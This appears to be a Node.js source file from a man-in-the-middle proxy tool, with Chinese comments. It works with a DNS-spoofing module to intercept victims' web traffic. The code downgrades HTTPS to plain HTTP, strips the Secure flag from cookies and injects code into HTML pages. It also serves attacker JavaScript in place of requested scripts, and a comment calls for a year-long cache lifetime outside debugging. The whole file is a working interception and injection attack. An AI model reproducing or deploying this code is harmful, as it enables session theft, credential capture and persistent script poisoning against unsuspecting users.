'use strict';

var proxyDns = require('./proxy_dns.js'),
	inject = require('./inject.js'),
	http = require('http'),
	https = require('https'),
	zlib = require('zlib');


var https_url = {};



/**
 * 处理代理响应
 */
function proxyResponse(clientReq, clientRes, serverRes, secure) {
	//console.log(serverRes.statusCode, serverRes.headers);

	//
	// 检测是否重定向到https站点
	//
	if (serverRes.statusCode == 302) {
		var newUrl = serverRes.headers['location'];

		if (newUrl && newUrl.substr(0, 8) == 'https://') {
			var url = newUrl.substr(8);
			https_url[url] = true;

			var pos = newUrl.indexOf('/', 8);
			clientReq.url = newUrl.substr(pos);
			clientReq.headers['host'] = newUrl.substring(8, pos);

			proxyRequest(clientReq, clientRes);
			clientReq.emit('end');

			console.log('[WEB] `%s` goto `%s`',
				clientReq.headers['host'] + clientReq.url,
				newUrl
			);
		}
	}


	var resHeader = serverRes.headers;

	//
	// 过滤cookie的Secure标记
	//
	var cookie = resHeader['set-cookie'] || [];
	for(var i = cookie.length - 1; i >= 0; --i) {
		cookie[i] = cookie[i].replace('; Secure', '');
	}

	//
	// 不是html文件直接转发
	//
	var content_type = resHeader['content-type'] || '';
	var mime = content_type.split(';')[0];

	if (mime != 'text/html') {
		clientRes.writeHead(serverRes.statusCode, resHeader);
		serverRes.pipe(clientRes);
		return;
	}

	//
	// gzip数据解压
	//
	var svrEnc = resHeader['content-encoding'];
	var stream = serverRes;

	if (svrEnc) {
		if (/gzip/i.test(svrEnc)) {
			stream = serverRes.pipe( zlib.createGunzip() );
		}
		else if (/deflate/i.test(svrEnc)) {
			stream = serverRes.pipe( zlib.createInflate() );
		}
	}

	//
	// 接收数据块到缓冲区
	//
	var data = new Buffer(0);

	stream.on('data', function(chunk) {
		data = Buffer.concat([data, chunk]);
	});

	stream.on('end', function() {
		//
		// 网页注入！
		//
		var charset = content_type.split('charset=')[1];
		data = inject.injectHtml(data, charset, secure);

		//
		// 返回注入后的网页（尽可能压缩）
		//
		var usrEnc = clientReq.headers['accept-encoding'];
		if (usrEnc) {
			if (/gzip/i.test(usrEnc)) {
				usrEnc = zlib.gzip;
			}
			else if (/deflate/i.test(usrEnc)) {
				usrEnc = zlib.deflate;
			}
		}

		if (usrEnc) {
			usrEnc(data, function(err, bin) {
				err? BadReq() : flush(bin);
			});
		}
		else {
			flush(data);
		}

		function flush(data) {
			resHeader['content-length'] = data.length;
			clientRes.writeHead(serverRes.statusCode, resHeader);
			clientRes.end(data);
		}
	});

	stream.on('error', function() {
		console.log('================================= zlib error ======');
		BadReq();
	});

	function BadReq() {
		clientRes.writeHeader(404);
		clientRes.end();
	}
}


/**
 * 发起代理请求
 */
function proxyRequest(clientReq, clientRes) {

	var reqHeader = clientReq.headers;
	var host = reqHeader['host'];
	var url = host + clientReq.url;
	var fromHttpsPage;

	var referer = reqHeader['referer'];
	if (referer) {
		//
		// 防止referer暴露来源页，替换其中的http为https
		//
		var refUrl = referer.split('//')[1];

		fromHttpsPage = https_url[refUrl];
		if (fromHttpsPage) {
			referer = referer.replace('http', 'https');
		}
	}

	//
	// 目标url在https列表中，
	//    则用https代理访问。
	// 如果资源的引用页在https列表中，
	//    则有可能是引用页中的相对路径（相对路径没法分析是https还是http的），
	//    也使用用https代理该资源（一般https页面的资源基本都是https的）。
	//
	var secure = https_url[url] || fromHttpsPage;

	var fullUrl = (secure? 'https://' : 'http://') + url;

	console.log('[WEB] %s\t%s %s',
		clientReq.connection.remoteAddress,
		clientReq.method,
		fullUrl
	);

	// 代理请求参数
	var request = secure? https.request : http.request;
	var options = {
		hostname: host,
		port: secure? 443 : clientReq.socket.localPort,
		path: clientReq.url,
		method: clientReq.method,
		headers: reqHeader
	};

	var proxy = request(options, function(serverRes) {
		proxyResponse(clientReq, clientRes, serverRes, secure);
	});

	proxy.on('error', function() {
		console.log('[WEB] Error', fullUrl);
		//console.log(reqHeader);
		clientRes.writeHeader(404);
		clientRes.end();
	});

	clientReq.pipe(proxy);
}


/**
 * 客户端HTTP请求
 */
function onClientRequest(clientReq, clientRes) {
	var host = clientReq.headers['host'];
	if (!host) {
		return;
	}

	var domain = host.match(/[^:]*/) + '';
	proxyDns.addWebDomain(domain);

	//
	// inject code
	//
	var url = clientReq.headers['host'] + clientReq.url;
	var js = inject.injectJs(url);
	if (js) {
		var data = new Buffer(js),
			sec = 1,     // 非调试状态下使用更大的数字 （365 * 24 * 3600）
			exp = new Date(Date.now() + sec * 1000),
			now = new Date().toGMTString();

		clientRes.writeHead(200, {
			'Content-Type': 'text/javascript',
			'Content-Length': data.length,

			'Cache-Control': 'max-age=' + sec,
			'Expires': exp.toGMTString(),
			'Date': now,
			'Last-Modified': now
		});
		clientRes.end(data);
	}
	else {
		proxyRequest(clientReq, clientRes);
	}
}


/**
 * 添加Web服务端口
 */
exports.addPort = function(port) {
	var svr = http.createServer(onClientRequest);

	svr.listen(port, function() {
		console.log("[WEB] listening %s:%d",
			svr.address().address,
			svr.address().port
		);
	});

	svr.on('error', function() {
		console.log('[WEB] CANNOT listen %d', port);
	});
}

exports.addHttpsUrl = function(url) {
	if (url.indexOf('/') == -1) {
		url += '/';
	}
	https_url[url] = true;
}